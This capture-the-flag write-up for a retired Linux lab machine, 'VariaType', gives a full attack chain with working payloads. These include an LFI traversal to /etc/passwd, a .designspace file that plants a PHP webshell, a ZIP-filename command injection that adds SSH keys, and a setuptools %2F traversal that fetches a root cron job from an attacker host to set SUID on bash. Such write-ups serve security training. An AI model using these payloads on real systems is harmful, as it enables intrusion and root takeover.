# VariaType

![OS](https://img.shields.io/badge/OS-Linux-333333?style=flat-square&logo=linux&logoColor=white) ![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square) ![Released](https://img.shields.io/badge/Released-2026--03--14-informational?style=flat-square)

| | |
|---|---|
| **OS** | Linux |
| **Difficulty** | Medium |
| **Release** | March 14, 2026 |
| **Rating** | 3.8 / 5 |
| **Points** | — (retired; no longer awards points) |

## Summary

VariaType is a Linux Medium box themed around a variable font design company. The attack chain involves three distinct CVEs: initial foothold via CVE-2025-66034 (fonttools varLib path traversal allowing PHP webshell injection into a font file via malicious `.designspace` upload), lateral movement to user `steve` via CVE-2024-25081/CVE-2024-25082 (FontForge ZIP archive filename command injection executed by a cron job), and root via a setuptools `PackageIndex.download()` path traversal where URL-encoded slashes (`%2F`) bypass a slash-count validation, allowing arbitrary file write as root — used to plant a malicious cron job.

---

## Recon

### Port Scan

```bash
nmap -sC -sV -T4 <TARGET_IP>
```

Key findings:
- **Port 22**: OpenSSH 9.2p1 Debian
- **Port 80**: Nginx 1.22.1 → redirect to `variatype.htb`

Add to `/etc/hosts`:
```
<TARGET_IP>  variatype.htb portal.variatype.htb
```

### Virtual Hosts

- `variatype.htb` — main marketing site with variable font generator tool
- `portal.variatype.htb` — authenticated portal (gitbot:G1tB0t_Acc3ss_2025!)

### Fingerprint Engine Results

- Web Fingerprint Engine: Flask/Werkzeug pattern → confirmed Python/Flask app (`variatype.htb`)
- portal.variatype.htb: PHP (Nginx + PHP-FPM)
- fonttools varLib endpoint at `/tools/variable-font-generator`

---

## Service Enumeration

### portal.variatype.htb

- Login page at `/auth.php`
- Credentials hardcoded in `auth.php`: `gitbot:G1tB0t_Acc3ss_2025!`
- File upload at `/upload.php` (uploads go to `/public/files/`)
- Download at `/download.php?file=` — **LFI vulnerable**
- LFI filter `str_replace("../","")` bypassed with `....//` double-dot trick:
  ```bash
  curl 'http://portal.variatype.htb/download.php?file=....//....//....//etc/passwd'
  ```

### variatype.htb — Variable Font Generator

- `/tools/variable-font-generator` accepts `.designspace` + master `.ttf` files
- Runs `fonttools varLib config.designspace` via subprocess
- **CVE-2025-66034**: Path traversal in varLib + PHP injection via `<labelname>` CDATA

---

## Foothold — CVE-2025-66034 (fonttools varLib → PHP Webshell)

### Vulnerability
- **Type**: Path traversal + code injection (CVE-2025-66034)
- **Service**: fonttools varLib
- **Discovery**: LFI revealed `app.py` which showed `subprocess.run(['fonttools', 'varLib', 'config.designspace'])`

### Exploitation

Craft a malicious `.designspace` file with path traversal + PHP injection in `<labelname>` CDATA:

```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="4.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" default="400" maximum="900"/>
  </axes>
  <sources>
    <source filename="Regular.ttf" familyname="Test" stylename="Regular">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
  </sources>
  <instances>
    <instance familyname="Test" stylename="Regular"
      filename="../../../var/www/portal.variatype.htb/public/files/cmd.php">
      <location><dimension name="Weight" xvalue="400"/></location>
      <kerning/>
      <info/>
      <glyphs>
        <glyph name="notdef" mute="0" unicode="0x0000">
          <masters>
            <master source="master0" x="0" y="0">
              <labelname xml:lang="en"><![CDATA[<?php if(isset($_GET['c'])){echo "CMDSTART";system($_GET['c']);echo "CMDEND";exit;}?>]]></labelname>
            </master>
          </masters>
        </glyph>
      </glyphs>
    </instance>
  </instances>
</designspace>
```

Upload with a dummy `Regular.ttf` master. The varLib tool writes the output font to `../../../var/www/portal.variatype.htb/public/files/cmd.php` — a PHP file containing the injected CDATA as a webshell embedded in the font binary.

### Shell Obtained

```bash
curl 'http://portal.variatype.htb/files/cmd.php?c=id'
# Output (embedded in font bytes): CMDSTARTuid=33(www-data)CMDEND
```

**User**: `www-data`
**Access Method**: PHP webshell in font file

---

## User Flag

### Path to User — CVE-2024-25081/25082 (FontForge ZIP Filename Command Injection)

#### Cron Discovery

Via LFI / webshell, found `/opt/process_client_submissions.bak`:
```bash
UPLOAD_DIR="/var/www/portal.variatype.htb/public/files"
SAFE_NAME_REGEX='^[a-zA-Z0-9._-]+'
# Files with SAFE names are processed by fontforge
timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c "
import fontforge
font = fontforge.open('$file')
..."
```

The cron runs as `steve` (uid=1000) and processes files from the portal upload directory. ZIP files pass the `SAFE_NAME_REGEX` check, but FontForge's internal extraction of ZIP archives calls `system(unarchivecmd)` with the inner filenames **unquoted** — CVE-2024-25081/25082.

#### Exploit

```bash
# Create ZIP with command injection as inner filename
python3 -c "
import zipfile
payload = 'x\$(bash /tmp/rev.sh).ttf'
with zipfile.ZipFile('fonts.zip', 'w') as z:
    z.writestr(payload, open('/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf','rb').read())
"
```

Create `/tmp/rev.sh` on target (via webshell):
```bash
#!/bin/bash
mkdir -p /home/steve/.ssh
echo "SSH_RSA_PUBKEY" >> /home/steve/.ssh/authorized_keys
chmod 700 /home/steve/.ssh
chmod 600 /home/steve/.ssh/authorized_keys
id > /tmp/steve_id_new.txt
```

Upload `fonts.zip` to portal. Wait ~60 seconds for cron. When FontForge processes the ZIP, it runs `system("unzip -o fonts.zip x$(bash /tmp/rev.sh).ttf -d /tmp/...")` — the `$(bash /tmp/rev.sh)` executes as steve.

```bash
# SSH as steve after key injection
SSH_AUTH_SOCK="" ssh -i ~/.ssh/lab_key -o IdentitiesOnly=yes steve@<TARGET_IP>
```

### Flag
```
[flag redacted]
```

---

## Privilege Escalation — setuptools PackageIndex URL Path Traversal

### Enumeration

```bash
sudo -l
# User steve may run the following commands on variatype:
#     (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

```python
# /opt/font-tools/install_validator.py (key parts)
from setuptools.package_index import PackageIndex
PLUGIN_DIR = "/opt/font-tools/validators"

def install_validator_plugin(plugin_url):
    index = PackageIndex()
    downloaded_path = index.download(plugin_url, PLUGIN_DIR)

# Validation: url must be http/https AND url.count('/') <= 10
```

### Vulnerability — setuptools `PackageIndex.download()` Path Traversal

The URL validation counts **literal slashes** (`/`), but URL-encoded slashes (`%2F`) are NOT counted. The `PackageIndex._download_url()` method:

```python
def _download_url(self, url, tmpdir):
    name, _fragment = egg_info_for_url(url)  # extracts basename
    # egg_info_for_url: base = urllib.parse.unquote(path.split('/')[-1])
    # %2Fetc%2Fcron.d%2Fevil → decodes to /etc/cron.d/evil
    filename = os.path.join(tmpdir, name)
    # os.path.join("/opt/font-tools/validators", "/etc/cron.d/evil") = "/etc/cron.d/evil"
    return self._download_other(url, filename)
```

**Key chain:**
1. URL `http://attacker/%2Fetc%2Fcron.d%2Fevil` has only 3 literal slashes → passes `count('/') <= 10`
2. `urlparse(url).path = '/%2Fetc%2Fcron.d%2Fevil'`
3. `path.split('/')[-1] = '%2Fetc%2Fcron.d%2Fevil'`
4. `urllib.parse.unquote(...)` = `/etc/cron.d/evil` (absolute path!)
5. `os.path.join(PLUGIN_DIR, "/etc/cron.d/evil")` = `/etc/cron.d/evil` (first arg ignored for absolute second arg)
6. File written to `/etc/cron.d/evil` **as root**

### Exploitation

```bash
# Start HTTP server serving malicious cron content
cat > /tmp/cron_server.py << 'EOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
CONTENT = b"* * * * * root bash -c \"chmod u+s /bin/bash\"\n"
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(CONTENT)
    def log_message(self, f, *a): print(f"[*] {f%a}")
HTTPServer(('0.0.0.0', 8888), Handler).handle_request()
EOF
python3 /tmp/cron_server.py &

# Run the exploit (URL-encoded path traversal to /etc/cron.d/)
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
  'http://<ATTACKER_IP>:8888/%2Fetc%2Fcron.d%2Fvariatype_root'

# Output: [+] Plugin installed successfully.
# Cron job written to /etc/cron.d/variatype_root as root!

# Wait 60 seconds for cron, then:
ls -la /bin/bash  # should show -rwsr-xr-x (SUID)
/bin/bash -p -c 'id; cat /root/root.txt'
# uid=1000(steve) euid=0(root) groups=1000(steve)
```

---

## Root Flag

### Flag
```
[flag redacted]
```

---

## Attack Chain Summary

```
Nmap (port 80) → variatype.htb Flask font generator
→ CVE-2025-66034 (fonttools varLib path traversal + PHP CDATA injection)
→ PHP webshell as www-data
→ LFI (....// bypass) to read cron script + portal credentials
→ CVE-2024-25081/25082 (FontForge ZIP inner filename command injection via cron)
→ SSH key injection → steve
→ sudo install_validator.py + setuptools PackageIndex %2F URL traversal
→ Write /etc/cron.d/root_backdoor as root
→ SUID bash → root
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scan, service version detection |
| curl | Web enumeration, LFI exploitation, webshell execution |
| python3 (zipfile) | Create malicious ZIP with command injection filename |
| SSH | Access as steve after key injection |
| Python HTTP server | Serve malicious cron payload for setuptools exploit |
| /bin/bash -p | Privilege escalation via SUID bash |

---

## Credentials Found

| Service | Username | Password/Key |
|---------|----------|--------------|
| portal.variatype.htb | gitbot | G1tB0t_Acc3ss_2025! (hardcoded in auth.php) |
| SSH | steve | RSA key injection (no password found) |

---

## Lessons Learned

1. **FontForge ZIP injection**: CVE-2024-25081/25082 — FontForge calls `system(unarchivecmd)` with unquoted inner filenames from ZIP archives. A safe-named ZIP passes cron script's `SAFE_NAME_REGEX`, but the INNER filename triggers `$(cmd)` execution. Key: use a real TTF as the ZIP content to ensure FontForge processes it.

2. **setuptools `%2F` traversal**: `PackageIndex.download()` counts literal `/` for validation, but `urllib.parse.unquote()` decodes `%2F` before `os.path.join()`. Since `os.path.join(base, "/absolute/path")` ignores base for absolute paths, this writes to arbitrary locations as root. The `..` filter exists but absolute paths don't need `..`.

3. **Font CDATA injection (CVE-2025-66034)**: fonttools varLib processes `<labelname>` CDATA when building variable fonts. If the output path traverses to a `.php` file in the web root, the CDATA content ends up in the font binary and is executed by PHP (since PHP searches for `<?php` anywhere in the response body).

4. **LFI `....//` bypass**: `str_replace("../","")` removes `../` once per call. `....//` becomes `../` after the substitution, enabling traversal. Pattern works with any depth.

---

## Dead Ends

- **FontForge FamilyName injection in SFD**: The `FamilyName` field in SFD files does NOT trigger `system()` calls during `fontforge.open()`. CVE-2024-25081/25082 is specifically triggered by ZIP archive extraction, not SFD parsing.
- **SUID /tmp/sbash**: Present on box from another player's prior attempt. Useful as shortcut but not the intended path.
- **setuptools file:// redirect**: `PackageIndex.download()` in v78.1.0 explicitly blocks redirects to `file://` URIs ("Redirection to url 'file://...' is not allowed"). File-read-via-redirect is patched. Use the `%2F` path write instead.
- **SSH with id_ed25519**: `~/.ssh/id_ed25519` has a passphrase. Use `~/.ssh/lab_key` (RSA, no passphrase) for HTB key injection.
- **SAFE_NAME_REGEX blocking filename injection**: Files with special chars in name go to quarantine. Only inner filenames in ZIPs trigger the injection. Outer ZIP name must match `^[a-zA-Z0-9._-]+`.

---

---

*Retired machine. Flag values are deliberately omitted — see the [repository README](../../README.md#ethics-and-policy).*
